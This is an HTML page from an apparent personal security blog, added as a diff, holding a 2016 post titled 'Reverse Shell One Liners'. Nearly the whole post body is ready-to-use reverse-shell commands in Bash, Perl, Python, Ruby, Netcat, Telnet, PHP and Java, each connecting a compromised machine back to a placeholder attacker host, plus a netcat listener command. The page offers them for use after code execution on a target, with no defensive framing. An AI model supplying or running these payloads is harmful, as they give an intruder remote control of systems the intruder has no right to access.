@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      Reverse Shell One Liners &middot; UB3RS3C
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/public/css/poole.css">
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/hyde.css">
+  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/apple-touch-icon-144-precomposed.png">
+                                 <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+</head>
+
+
+ 	<!-- <body class="theme-base-ff layout-reverse"> -->
+	<body class="layout-reverse">
+
+    <div class="sidebar">
+  <!-- <div class="container sidebar-sticky"> -->
+    <!-- to make the sidebar contents from top to bottom -->
+  <div class="container">
+    <div class="sidebar-about">
+      <h1>
+        <a href="/">
+          UB3RS3C
+        </a>
+      </h1>
+      <p class="lead">Learning stuff, one topic at a time.</p>
+    </div>
+
+    <nav class="sidebar-nav">
+      <a class="sidebar-nav-item" href="/">Home</a>
+
+      
+
+      
+      
+        
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item" href="/about/">About me</a>
+          
+        
+      
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+
+      <!-- <a class="sidebar-nav-item" href="https://github.com/poole/hyde/archive/v2.1.0.zip">Download</a> -->
+      <!-- <a class="sidebar-nav-item" href="https://github.com/poole/hyde">GitHub project</a> -->
+      <span class="sidebar-nav-item">Currently v2.1.0</span>
+    </nav>
+
+    <p>&copy; 2019. All rights reserved.</p>
+  </div>
+</div>
+
+
+    <div class="content container">
+    <!-- <div class="container"> -->
+      <div class="post">
+  <h1 class="post-title">Reverse Shell One Liners</h1>
+  <span class="post-date">01 Sep 2016</span>
+  <p>There might be several occasions where you might have code execution on a target machine and you sit there wondering what to do next.</p>
+
+<p>Well here is what you can do. Setup <strong>netcat</strong> listener on port <strong>4444</strong>.</p>
+<pre><code class="language-bash">nc -nvlp 4444
+</code></pre>
+<p>Bash</p>
+<pre><code class="language-bash">exec /bin/bash 0&amp;0 2&gt;&amp;0
+
+0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+
+exec 5&lt;&gt;/dev/tcp/attackerip/4444
+cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done  # or:
+while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done
+
+bash -i &gt;&amp; /dev/tcp/attackerip/4444 0&gt;&amp;1
+</code></pre>
+<!-- more -->
+<p>Perl</p>
+<pre><code class="language-perl">//Does not depend on /bin/sh
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+
+//Windows target
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+
+//Could try this one also. (*nix /bin/sh)
+perl -e 'use Socket;$i="attackerip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</code></pre>
+<p>Python</p>
+<pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</code></pre>
+<p>Ruby</p>
+<pre><code class="language-ruby">//Does not depend on /bin/sh
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+//Windows Target
+ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+//*nix /bin/sh
+ruby -rsocket -e'f=TCPSocket.open("attackerip",4444).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
+</code></pre>
+<p>Netcat</p>
+<pre><code class="language-bash">nc attackerip 4444 -e /bin/sh
+/bin/sh | nc attackerip 4444
+rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/p
+</code></pre>
+<p>Telnet</p>
+<pre><code class="language-bash">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet attackerip 4444 0/tmp/p
+Or:
+telnet attackerip 4444 | /bin/bash | telnet attackerip 4445
+# Setup listener on attcker machine on port 4445/tcp
+</code></pre>
+<p>PHP</p>
+<pre><code class="language-php">php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+# This code assumes that the TCP connection uses file descriptor 3. 
+# If it doesn’t work, try 4, 5, 6…
+</code></pre>
+<p>Java Reverse Shell</p>
+<pre><code class="language-java">r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
+p.waitFor()
+</code></pre>
+
+</div>
+
+<div class="related">
+  <h2>Related Posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2019/10/10/pa-adlab/">
+            Pentester Academy Attacking and Defending Active Directory Lab
+            <small>10 Oct 2019</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2018/09/21/objection-remote-device-app-hook/">
+            (Objection) Mobile apps on remote device
+            <small>21 Sep 2018</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2018/08/26/mobile-pt-frameworks/">
+            Passionfruit, Objection and Drozer
+            <small>26 Aug 2018</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+    </div>
+
+  </body>
+</html>
+
+
